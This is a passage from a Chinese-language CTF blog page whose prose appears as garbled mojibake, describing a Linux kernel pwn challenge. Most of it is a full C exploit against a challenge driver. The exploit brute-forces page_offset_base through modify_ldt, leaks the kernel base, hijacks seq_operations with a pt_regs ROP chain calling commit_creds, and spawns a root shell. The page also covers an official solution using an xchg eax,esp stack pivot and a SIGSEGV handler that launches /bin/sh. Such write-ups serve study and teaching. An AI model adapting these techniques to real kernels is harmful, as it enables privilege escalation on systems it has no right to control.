<p>çˆ†ç ´å‡ºæ¥<code>page_offset_base</code>,é‚£å°±å¯ä»¥åˆ©ç”¨<code>read_ldt</code>åœ¨è¿™æ®µåœ°å€ä¸Šè¯»å–å †ä¿¡æ¯ï¼Œå †ä¸­å°±æœ‰kernel_baseåœ°å€ï¼Œç„¶åå°±æ˜¯<code>seq_operations</code>+å†…æ ¸<code>pt_regs</code>æ ˆè¿ç§»æ‰“äº†ã€‚</p>
<h3 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> add_rsp_0x180_pop_3_ret 0xffffffff815141ae</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_ret 0xffffffff8108c420</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xffffffff81c00fb0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds 0xffffffff810c9540</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred 0xffffffff810c99d0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_2_ret 0xffffffff810006a6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ret_gadget 0xffffffff810001fc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> ret_addr;</span><br><span class="line"><span class="keyword">size_t</span> pop_2_ret_addr;</span><br><span class="line"><span class="keyword">size_t</span> add_rsp_0x180_pop_3_ret_addr;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi_ret_addr;</span><br><span class="line"><span class="keyword">size_t</span> swapgs_restore_regs_and_return_to_usermode_addr;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds_addr;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred_addr;</span><br><span class="line"><span class="keyword">int</span> offsets;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ko_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_free</span><span class="params">(<span class="keyword">size_t</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=idx;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27;0&#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_edit</span><span class="params">(<span class="keyword">size_t</span> idx,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=idx;</span><br><span class="line">    args[<span class="number">1</span>]=<span class="number">8</span>;</span><br><span class="line">    args[<span class="number">2</span>]=buf;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27;P&#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_add</span><span class="params">(<span class="keyword">size_t</span> size,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=size;</span><br><span class="line">    args[<span class="number">1</span>]=buf;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27; &#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] debug\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">u_desc</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv, <span class="keyword">char</span> ** envp)</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    <span class="keyword">char</span> buf1[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">char</span> buf2[<span class="number">0x1000</span>];</span><br><span class="line">    ko_fd=open(<span class="string">&quot;/dev/kernelpwn&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(buf1,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">    chunk_add(<span class="number">0x10</span>,buf1);</span><br><span class="line">    chunk_free(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    u_desc.base_addr=<span class="number">0xff0000</span>;</span><br><span class="line">    u_desc.entry_number=<span class="number">0x1000</span>/<span class="number">8</span>;</span><br><span class="line">    u_desc.limit=<span class="number">0</span>;</span><br><span class="line">    u_desc.seg_32bit=<span class="number">0</span>;</span><br><span class="line">    u_desc.contents=<span class="number">0</span>;</span><br><span class="line">    u_desc.read_exec_only=<span class="number">0</span>;</span><br><span class="line">    u_desc.limit_in_pages=<span class="number">0</span>;</span><br><span class="line">    u_desc.seg_not_present=<span class="number">0</span>;</span><br><span class="line">    u_desc.useable=<span class="number">0</span>;</span><br><span class="line">    u_desc.lm=<span class="number">0</span>;</span><br><span class="line">    syscall(SYS_modify_ldt,<span class="number">1</span>,&amp;u_desc,<span class="keyword">sizeof</span>(u_desc));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> page_offset_base=<span class="number">0xffff888000000000</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">        <span class="keyword">int</span> ret=syscall(SYS_modify_ldt,<span class="number">0</span>,buf1,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            page_offset_base+=<span class="number">0x40000000</span>;</span><br><span class="line">            *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base_addr:%p\n&quot;</span>,page_offset_base);</span><br><span class="line">    <span class="comment">// size_t addr=page_offset_base;</span></span><br><span class="line">    <span class="comment">// *(size_t *)buf1=addr;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// for(int i=0;i&lt;0x200;i++)&#123;</span></span><br><span class="line">    <span class="comment">//     chunk_edit(0,buf1);</span></span><br><span class="line">    <span class="comment">//     int ret=syscall(SYS_modify_ldt,0,buf2,0x1000);</span></span><br><span class="line">    <span class="comment">//     if(ret&lt;0)&#123;</span></span><br><span class="line">    <span class="comment">//         printf(&quot;write again fail\n&quot;);</span></span><br><span class="line">    <span class="comment">//         continue;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     for(int j=0;j&lt;0x1000/8;j++)&#123;</span></span><br><span class="line">    <span class="comment">//         size_t content=*((size_t *)buf2+j);</span></span><br><span class="line">    <span class="comment">//         if((content&amp;0xffffffff00000000)==0xffffffff00000000)&#123;</span></span><br><span class="line">    <span class="comment">//             if((content&amp;0xffffffff)!=0xffffffff)&#123;</span></span><br><span class="line">    <span class="comment">//                 printf(&quot;kernel_addr:%p  content:%p\n&quot;,addr+8*j,*((size_t *)buf2+j));</span></span><br><span class="line">    <span class="comment">//             &#125;</span></span><br><span class="line">                </span><br><span class="line">    <span class="comment">//         &#125;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     addr+=0x1000;</span></span><br><span class="line">    <span class="comment">//     *(size_t *)buf1=addr;</span></span><br><span class="line">    <span class="comment">//     memset(buf2,0,0x1000);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">size_t</span> addr=page_offset_base+<span class="number">0x9d000</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf1=addr;</span><br><span class="line">    chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">    syscall(SYS_modify_ldt,<span class="number">0</span>,buf2,<span class="number">0x1000</span>);</span><br><span class="line">    kernel_base=*(<span class="keyword">size_t</span> *)buf2<span class="number">-0x40</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] kernel_base:%p\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    chunk_add(<span class="number">0x20</span>,buf1);</span><br><span class="line">    chunk_free(<span class="number">1</span>);</span><br><span class="line">    seq_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    add_rsp_0x180_pop_3_ret_addr=add_rsp_0x180_pop_3_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    pop_rdi_ret_addr=pop_rdi_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    commit_creds_addr=commit_creds-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    prepare_kernel_cred_addr=prepare_kernel_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode_addr=swapgs_restore_regs_and_return_to_usermode-vmlinux_nokaslr_addr+kernel_base+<span class="number">0xe</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf1=add_rsp_0x180_pop_3_ret_addr;</span><br><span class="line">    chunk_edit(<span class="number">1</span>,buf1);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, pop_rdi_ret_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, prepare_kernel_cred_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, commit_creds_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, 0;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0x200;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// read(seq_fd,buf1,0x200);</span></span><br><span class="line">    usr_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å®˜æ–¹è§£æ³•"><a href="#å®˜æ–¹è§£æ³•" class="headerlink" title="å®˜æ–¹è§£æ³•"></a>å®˜æ–¹è§£æ³•</h2><p>ååˆ†å·§å¦™çš„è§£æ³•ï¼Œå­¦åˆ°äº†å¾ˆå¤šã€‚</p>
<p>å®˜æ–¹å‰æœŸçš„åœ°å€çˆ†ç ´å’Œæˆ‘å¤§å·®ä¸å·®ï¼Œä½†åœ¨åé¢å¯¹<code>seq_operations</code>çš„<code>start</code>æŒ‡é’ˆçš„åˆ©ç”¨å¼€å§‹ä¸ä¸€æ ·äº†ï¼Œç”±äºåªå¼€äº†<code>kpti</code>å’Œ<code>smep</code>ï¼Œæ‰€ä»¥åœ¨å†…æ ¸æ€è¿˜æ˜¯å¯ä»¥è®¿é—®ç”¨æˆ·æ€æ•°æ®çš„ï¼Œæ‰€ä»¥å¯ä»¥åœ¨ç”¨æˆ·æ€å¸ƒç½®å†…æ ¸ropç„¶ååœ¨å†…æ ¸æ€ç›´æ¥æŠŠspå¯„å­˜å™¨è¿ç§»åˆ°ç”¨æˆ·æ€ã€‚</p>
<p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/figure/476px-Kernel_page-table_isolation.svg.png" alt="File:Kernel page-table isolation.svg"></p>
<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæ€ä¹ˆåˆ©ç”¨ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆè®©rspæŒ‡å‘è‡ªå·±å¸ƒç½®åœ¨å†…æ ¸æ€çš„ropå‘¢ï¼Œå®˜æ–¹è§£æ³•é‡Œç»™å‡ºäº†ä¸€ä¸ªååˆ†å·§å¦™ï¼ˆè‡³å°‘æˆ‘ç¬¬ä¸€æ¬¡è§ï¼‰çš„æ–¹æ³•ï¼Œå°±æ˜¯åˆ©ç”¨ä»¥ä¸‹gadget</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xchg_eax_esp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>xchgå°±æ˜¯äº’æ¢ä¸¤ä¸ªå¯„å­˜å™¨çš„æ•°æ®ï¼Œä¸€èˆ¬å‡½æ•°æŒ‡é’ˆéƒ½æ˜¯å…ˆåŠ è½½åˆ°raxå¯„å­˜å™¨ä¸­ç„¶åå†<code>call rax</code>çš„ï¼Œæ‰€ä»¥æ‰§è¡Œ<code>xchg eax, esp</code>çš„æ—¶å€™raxå°±æŒ‡å‘è¿™ä¸ªgadgetçš„åœ°å€ï¼Œè¿™ä¸ªgadgetçš„åœ°å€æ˜¯å¯æ§çš„ï¼Œä½†æ˜¯å¯æƒœæ˜¯å†…æ ¸åœ°å€ï¼Œä½†æ˜¯æ³¨æ„è¿™ä¸ªgadgetåªæ˜¯äº¤æ¢å¯„å­˜å™¨çš„å32ä½ï¼Œäº¤æ¢å®Œåçš„espå°±è½åˆ°äº†ç”¨æˆ·æ€äº†ï¼Œéšæ„æˆ‘ä»¬åªè¦<code>mmap(xchg_eax_esp &amp; 0xfffff000, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);</code>å°±å¯ä»¥æŠŠrspæŒ‡å‘ç”¨æˆ·æ€äº†ã€‚</p>
<p>å®˜è§£åœ¨å¸ƒç½®ropçš„æ—¶å€™æ²¡æœ‰é‡æ–°è®¾ç½®<code>cr3</code>çš„å€¼ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰æ›´æ¢é¡µè¡¨ï¼Œæ‰€ä»¥æœ€åè¿”å›ç”¨æˆ·æ€ä¹‹åæ‰§è¡ŒæŒ‡ä»¤è‚¯å®šä¼šçˆ†æ®µé”™è¯¯ï¼Œå®˜è§£æ˜¯è¿™æ ·å¤„ç†çš„,ä»–è®¾ç½®äº†æ®µé”™è¯¯çš„å¤„ç†å‡½æ•°ï¼Œè¿™æ ·åœ¨å‘ç”Ÿäº†æ®µé”™è¯¯ä»¥åï¼Œé‡æ–°é™·å…¥å†…æ ¸æ€ï¼Œç„¶åå†…æ ¸æ€è‡ªåŠ¨åˆ‡æ¢åˆ°ç”¨æˆ·æ€ç„¶åæ‰§è¡Œå¤„ç†å‡½æ•°<code>spawn_shell</code>ï¼Œè¿™æ ·å°±å¯ä»¥ä¸ç”¨æˆ‘ä»¬å¸ƒç½®ä½†æ˜¯å®Œç¾çš„è¿”å›åˆ°äº†ç”¨æˆ·æ€å¹¶æ‰§è¡Œç”¨æˆ·æ€æŒ‡ä»¤äº†ã€‚</p>
<p>ä½†æ˜¯ç›´æ¥å¸ƒç½®<code>swapgs_restore_regs_and_return_to_usermode</code>ä½¿ç”¨çš„å†…å­˜å…¶å®å·®ä¸å¤šçš„ï¼Œå˜¿å˜¿ï¼Œå¯ä»¥ç”¨ä½†æ˜¯æ²¡å¿…è¦ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spawn_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">signal(SIGSEGV, spawn_shell);</span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>é€šè¿‡è¿™é“é¢˜ä¹Ÿæ˜¯å­¦åˆ°äº†å¾ˆå¤šï¼Œæ›´åŠ ç†Ÿæ‚‰ç”¨æˆ·æ€é¡µè¡¨å’Œå†…æ ¸æ€é¡µè¡¨çš„éš”ç¦»æœºåˆ¶äº†ï¼Œæ¯”å¦‚å¼€äº†kptiä½†æ˜¯ä¸å¼€smepåœ¨å†…æ ¸æ€æ—¶å…¶å®å’Œå¼€äº†æ²¡æœ‰å·®åˆ«ï¼Œä½†æ˜¯å¼€äº†kptiå¼€ä¸å¼€smapå·®åˆ«è¿˜æ˜¯æŒºå¤§çš„ã€‚</p>
<p>ç„¶åæ˜¯å¯¹<code>swapgs_restore_regs_and_return_to_usermode</code>çš„ç†è§£ï¼Œåœ¨å­¦ä¹ <code>ret2dir</code>çš„æ—¶å€™æˆ‘ä¸ç†è§£ä¸ºä»€ä¹ˆäº¤æ¢äº†é¡µè¡¨ä¹‹åè¿˜æ˜¯å¯ä»¥ç»§ç»­æ‰§è¡Œ<code>swapgs_restore_regs_and_return_to_usermode</code>,é€šè¿‡<code>mit6.s081</code>çš„å­¦ä¹ ï¼Œèƒ½è¿™æ ·åšçš„å”¯ä¸€è§£æ³•å°±æ˜¯è¿™ä¸ªå‡½æ•°åœ¨ç”¨æˆ·æ€å’Œå†…æ ¸æ€éƒ½è¿›è¡Œäº†æ˜ å°„ï¼Œç„¶åæ˜ å°„çš„è™šæ‹Ÿåœ°å€æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œä¹Ÿä½è¯äº†ç”¨æˆ·æ€é¡µè¡¨æ˜ å°„äº†å°‘é‡çš„å†…æ ¸æ€åœ°å€ã€‚</p>
<p>è¿™é“é¢˜åœ¨çˆ†ç ´åˆ°å†…æ ¸åœ°å€åå°±æ˜¯æ¯”è¾ƒç®€å•äº†ï¼ŒåŸå› æ˜¯æ²¡æœ‰å¼€<code>pt_regs</code>çš„åç§»å’Œ<code>smap</code>,å‡å¦‚è¿™ä¸¤ä¸ªéƒ½å¼€äº†çš„è¯ï¼Œç›®å‰æˆ‘èƒ½æƒ³åˆ°çš„è§£æ³•å°±æ˜¯åˆ©ç”¨<code>ret2dir</code>è¿›è¡Œropäº†ï¼Œè¿™æ ·ä¼šæ¯”è¾ƒéº»çƒ¦ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/26/kernelpwn-%E5%86%8D%E5%85%A5%E9%97%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/26/kernelpwn-%E5%86%8D%E5%85%A5%E9%97%A8/" class="post-title-link" itemprop="url">kernelpwn å†å…¥é—¨</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-07-26 17:58:24" itemprop="dateCreated datePublished" datetime="2022-07-26T17:58:24+08:00">2022-07-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-07-29 23:29:51" itemprop="dateModified" datetime="2022-07-29T23:29:51+08:00">2022-07-29</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>ä¹‹å‰å­¦ä¹ è¿‡ä¸€ä¼škernelpwn,ä½†æ„Ÿè§‰å­¦ä¹ çš„ä¸æ˜¯å¾ˆæ·±å…¥å¾ˆæ‰å®ï¼Œå¯¼è‡´ç°åœ¨å¥½å¤šä¸œè¥¿ä¹Ÿéƒ½å¿˜äº†ï¼Œé‚£å°±å†å…¥é—¨ä¸€æ¬¡å§ã€‚</p>
